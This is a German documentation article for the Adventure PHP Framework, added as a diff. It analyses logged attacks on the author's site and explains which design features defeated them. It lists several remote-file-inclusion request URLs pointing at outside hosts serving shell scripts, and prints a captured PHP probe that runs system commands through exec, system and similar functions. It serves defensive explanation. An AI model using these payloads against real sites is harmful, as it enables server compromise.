@@ -1,0 +1,219 @@
+<doku:title parent="100" tags="tutorials,frontcontroller,bild auslieferung,login pr&uuml;fung,modelbasiertes gui design" title="Hacking &amp; das APF" urlname="Hacking-und-das-APF">
+  Im vorliegenden Artikel zieht der Autor Bilanz &uuml;ber die letzten 3 Monate des Betriebs der
+  Webseite und zeigt, welche potentiellen Angriffe bereits durch das Design des Frameworks
+  abgewehrt werden k&ouml;nnen.
+</doku:title>
+<h3 id="Chapter-1-Rueckblick"><a href="#Chapter-1-Rueckblick">1. R&uuml;ckblick</a></h3>
+Blickt man auf die letzten 3 Monate des Jahres 2007 zur&uuml;ck, so wurde vermehrt der Versuche
+unternommen mit geziehlten Requests Schwachstellen der eingesetzten Software auszunutzen um so an
+wichtige Informationen &uuml;ber die Software, den Server oder Benutzerdaten zu gelangen. Eine
+Auswertung der Logfiles des genannten Zeitraums zeigt, dass im vergangenen Quartal &uuml;ber
+<strong>2500 XSS-Angriffe</strong> zu verzeichnen waren. Davon f&uuml;hrten <strong>353 Anfragen</strong>
+zu Applikationsfehlern. Eine vollst&auml;ndige Auswertung der Logfiles findet sich unter
+<a href="/frontend/media/http_hacks_2008_01_07.txt" title="http_hacks_2008_01_07.txt">http_hacks_2008_01_07.txt</a>.
+<br />
+<br />
+<br />
+<h3 id="Chapter-2-Sicherheit-und-das-APF"><a href="#Chapter-2-Sicherheit-und-das-APF">2. Sicherheit & das Adventure PHP Framework</a></h3>
+Betrachtet man die aufgef&uuml;hrten Applikationsfehler genauer, stellt man fest, dass diese keine
+Fehler im Sinne eines Bufferoverflows oder einer Schwachstelle sind, sondern Fehlermeldungen, die
+von den Framework-Komponenten im Fehlerfall geziehlt ausgel&ouml;st werden. Von den genannten
+<strong>353 Fehlern</strong> f&uuml;hrten daher genau <strong>0 Anfragen</strong> zu einem
+erfolgreichen Kompromittieren der Seite und den darauf befindlichen Applikationen.
+<br />
+<br />
+Gr&uuml;nde daf&uuml;r liegen in der Architektur des Frameworks und der betriebenen Software:
+<ul>
+  <li>
+    <strong>Konfiguration</strong>:
+    <br />
+    Konfigurationsaufgaben werden konsequent &uuml;ber den <strong>configurationManager</strong>
+    gezogen. Dieser verwendet keine Parameter aus dem REQUEST und wird nur &uuml;ber die Applikation
+    selbst verwendet.
+    <br />
+    <br />
+  </li>
+  <li>
+    <strong>URL-Layout</strong>:
+    <br />
+    Das URL-Layout muss einem definierten Schema entsprechen. M&ouml;gliche XSS-L&uuml;cken fallen
+    daher bei Verwendung der Komponenten <strong>LinkHandler</strong> und
+    <strong>FrontcontrollerLinkHandler</strong> dadurch auf, dass eine URL wie sie unter Kapitel 3
+    beschrieben ist nicht geparst werden kann.
+    <br />
+    <br />
+  </li>
+  <li>
+    <strong>Templates</strong>:
+    <br />
+    Der PageController verarbeitet Templates nicht wie viele andere Frameworks als PHP-Skripten.
+    PHP-Code, der evtl. durch XSS-L&uuml;cken eingeschleust werden kann - sollte die auf dem
+    Framework aufsetzende Software derartige L&uuml;cken aufweisen - wird daher <strong>nicht</strong>
+    ausgef&uuml;hrt, sondern lediglich zur Anzeige gebracht.
+    <br />
+    <br />
+  </li>
+  <li>
+    <strong>Bootstrap-Architektur</strong>:
+    <br />
+    Durch die Bootstrap-Architektur (=alle Requests werden &uuml;ber eine zentrale Datei abgewickelt)
+    k&ouml;nnen Anfragen wie <em>/content.php?seite=http://casts.150m.com/expo/expo1?</em> keinen
+    Schaden anrichten.
+    <br />
+    <br />
+  </li>
+  <li>
+    <strong>Steuerparameter</strong>:
+    <br />
+    Steuerparameter in URLs, die direkt auf das Inkludieren von Templates Einfluss haben greifen
+    nicht direkt und unkontrolliert auf das Dateisystem durch, sondern gelten nur in einem definierten
+    Namespace. Wird ein Template nicht gefunden, so wird ein Applikationsfehler angezeigt, was das
+    Auslesen von System-Dateien nicht m&ouml;glich macht. Steuerparameter in FrontController-Actions
+    werden zus&auml;tzlich &uuml;ber eine Konfiguration abstrahiert und greifen nicht direkt auf
+    Filesystemressourcen zu.
+  </li>
+</ul>
+<br />
+<h3 id="Chapter-3-Angriffe"><a href="#Chapter-3-Angriffe">3. Beispiele f&uuml;r Angriffe</a></h3>
+Hinter den Angriffen steckt zumeist der Versuch, PHP-Code in eine verwundbare Seiten einzuschl&auml;usen
+und auszuf&uuml;hren um Informationen &uuml;ber den Server, die eingesetzter Software und evtl.
+Benutzerdaten zu erlangen. In manchen dieser Skripte wird zudem versucht ein Programm auf dem
+Ziel-Server zu installieren.
+<br />
+<br />
+Die folgende Code-Box zeigt eine Auswahl der beschriebenen Angriffe und erl&auml;tert anschlie&szlig;end
+die Funktion an Hand eines Beispiels.
+<gen:highlight type="apf-xml">
+/myevent.php?myevent_path=http://countryangelz.com/counter/var/safeon.txt??
+
+/admin/addentry.php?phpbb_root_path=http://intranet.stantonmortgage.com/modules/admin/bersama/doc.txt?
+
+/administrator/components/com_uhp/uhp_config.php?mosConfig_absolute_path=http://www.nortek.helloweb.eu/contr.txt?
+
+/forum.php?cfg_file=1&fpath=http://www.donagro.ru/files/images/search4.gif???
+
+/include.php?p4a_root_dir=http://www.lacs.de/NgL??
+
+/administrator/components/com_bayesiannaivefilter/lang.php?mosConfig_absolute_path=http://www.apnic.net/index.html?
+
+/content.php?seite=http://casts.150m.com/expo/expo1?
+
+/includes/function.php?root_path=http://www.cervo.com/public/r57.txt???
+
+/index.php?pager=http://201.37.71.117:8090/cmd.txt??
+</gen:highlight>
+Der nachfolgend aufgef&uuml;hrte PHP-Code zeigt ein Script, das Informationen &uuml;ber einen Server
+ausliest und ausgibt. Aus Sicherheitsgr&uuml;nden und zum Schutz vor Trittbrettfahrer wurde ein
+ungef&auml;hrliches Beispiel gew&auml;hlt.
+<gen:highlight type="php">
+$dir = @getcwd();
+echo "S4M3K<br>";
+$OS = @PHP_uname();
+echo "OSTYPE:$OS<br>";
+$free = disk_free_space($dir);
+
+if ($free === FALSE) {$free = 0;}
+
+if ($free < 0) {$free = 0;}
+echo "Free:".view_size($free)."<br>";
+
+$cmd="id";
+$eseguicmd=ex($cmd);
+echo $eseguicmd;
+
+function ex($cfe){
+$res = '';
+if (!empty($cfe)){
+if(function_exists('exec')){
+@exec($cfe,$res);
+$res = join("\n",$res);
+}
+elseif(function_exists('shell_exec')){
+$res = @shell_exec($cfe);
+}
+elseif(function_exists('system')){
+@ob_start();
+@system($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+}
+elseif(function_exists('passthru')){
+@ob_start();
+@passthru($cfe);
+$res = @ob_get_contents();
+@ob_end_clean();
+}
+elseif(@is_resource($f = @popen($cfe,"r"))){
+$res = "";
+while(!@feof($f)) { $res .= @fread($f,1024); }
+@pclose($f);
+}}
+return $res;
+}
+
+function view_size($size)
+
+{
+
+if (!is_numeric($size)) {return FALSE;}
+
+else
+
+{
+
+if ($size >= 1073741824) {$size = round($size/1073741824*100)/100 ." GB";}
+
+elseif ($size >= 1048576) {$size = round($size/1048576*100)/100 ." MB";}
+
+elseif ($size >= 1024) {$size = round($size/1024*100)/100 ." KB";}
+
+else {$size = $size . " B";}
+
+return $size;
+
+}}
+
+exit;
+</gen:highlight>
+Analysiert man den Orginalquelltext, so sind darin zun&auml;chst zwei Funktionsdefinitionen enthalten:
+<strong>ex()</strong> und <strong>view_size()</strong>. Diese werden ben&ouml;tigt um Shellbefehle
+auszuf&uuml;hren bzw. freie Festplattenressourcen anzuzeigen. Die Funktion des Quellcodes besteht
+im Grunde darin, einen Kenner in den Quelltext zu implantieren, der sp&auml;ter abgefragt werden kann
+(<strong>S4M3K</strong>), den noch freien Plattenplatz anzuzeigen (<strong>disk_free_space()</strong>)
+und herauszufinden, unter welchem Benutzer der Webserver betrieben wird. Da hier auf das UNIX/LINUX-
+Systemprogramm <strong>id</strong> zur&uuml;ckgegriffen wird funktioniert dies nur unter UNIX/LINUX-
+Betriebssystemen, in denen die Funktionen <strong>exec()</strong>, <strong>shell_exec()</strong> und
+<strong>system()</strong> nicht deaktiviert sind.
+<br />
+<br />
+Aus den gewonnenen Informationen kann der Angreifer dann schlie&szlig;en, wo Programme installiert
+werden k&ouml;nnen, oder ob das installierte System bekannte Schwachstellen besitzt, die mit
+bekannten Exploits ausgenutzt werden k&ouml;nnen.
+<br />
+<br />
+<br />
+<h3 id="Chapter-4-Recherche"><a href="#Chapter-4-Recherche">4. Recherche</a></h3>
+Einige der aufgerufenen URLs deuten auf den Versuch hin, bekannte Schwachstellen in verbreiteten
+PHP-Applikationen auszunutzen um Schaden anzurichten. Sucht man nach Schl&uuml;sselw&ouml;rtern, die
+in den oben aufgef&uuml;hrten Request-URLS auftauchen, so findet man Software-Komponenten wie
+<strong>myEvent</strong>, <strong>PHP-Nuke</strong>, <strong>Joomla</strong> und <strong>PHPBB</strong>:
+<ul>
+  <li>
+    <strong>myevent_path</strong>:
+    <doku:link>http://entwickler.de/zonen/portale/psecom,id,250,security,8949,p,0.html</doku:link>
+  </li>
+  <li>
+    <strong>phpbb_root_path</strong>:
+    <doku:link>http://secunia.com/advisories/15244/</doku:link>
+  </li>
+  <li>
+    <strong>mosConfig_absolute_path</strong>:
+    <doku:link>http://www.joomlaportal.de/sicherheit/90794-mosconfig_absolute_path-attacke.html</doku:link>
+  </li>
+  <li>
+    <strong>forum.php?cfg_file</strong>:
+    <doku:link>http://securityreason.com/exploitalert/1285</doku:link>
+  </li>
+</ul>
+<br />
+<core:importdesign namespace="modules::comments::pres::templates" template="comment" categorykey="de_060" />
